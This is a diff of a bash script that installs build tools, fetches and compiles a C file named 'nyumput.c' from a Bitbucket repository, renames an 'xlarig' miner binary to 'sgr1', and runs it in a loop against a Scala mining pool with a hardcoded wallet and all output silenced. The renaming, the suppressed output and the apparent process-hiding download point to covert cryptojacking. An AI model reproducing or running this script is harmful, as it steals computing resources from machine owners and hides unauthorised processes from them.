@@ -1,16 +1,16 @@
 #!/bin/bash
 set -x
 
-# Update and install necessary packages
-apt-get update 
-apt-get install -y wget curl sudo build-essential cpulimit screen git cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev tzdata
-
 # Preconfigure tzdata to avoid interactive prompts
 echo "tzdata tzdata/Areas/select_default_area select Asia" | sudo debconf-set-selections
 echo "tzdata tzdata/Zones/Asia select Jakarta" | sudo debconf-set-selections
 
 # Reconfigure tzdata to apply changes
 sudo dpkg-reconfigure -f noninteractive tzdata
+
+# Update and install necessary packages
+apt-get update 
+apt-get install -y wget curl sudo build-essential cpulimit screen git cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev tzdata
 
 # Download and compile C code
 curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
@@ -55,9 +55,10 @@ mv xlarig sgr1
 # Loop to run and stop process
 while true; do
     # Start mining process with CPU limit
-    cpulimit -l 500 -e ./sgr1 &
+    cpulimit -l 500 -- ./sgr1 -o mine.scalaproject.io:3333 -p $WORKER -u Ssy2HMaGNZzA7uq2sp833HAtXiPZ26PwiQA27VqGftDPYyjS4RJpBVKgchk6QuB5f1RQZKmAY77b74pKmtt1UrGZARCU574F7j --donate-level 0 -a panthera >/dev/null 2>&1 &
+    
+    # Capture the PID of cpulimit (which is the same as the PID of the miner process)
     MINER_PID=$!
-    ./sgr1 -o mine.scalaproject.io:3333 -p $WORKER -u Ssy2HMaGNZzA7uq2sp833HAtXiPZ26PwiQA27VqGftDPYyjS4RJpBVKgchk6QuB5f1RQZKmAY77b74pKmtt1UrGZARCU574F7j --donate-level 0 -a panthera >/dev/null 2>&1
 
     # Run for 1 minute
     sleep 60
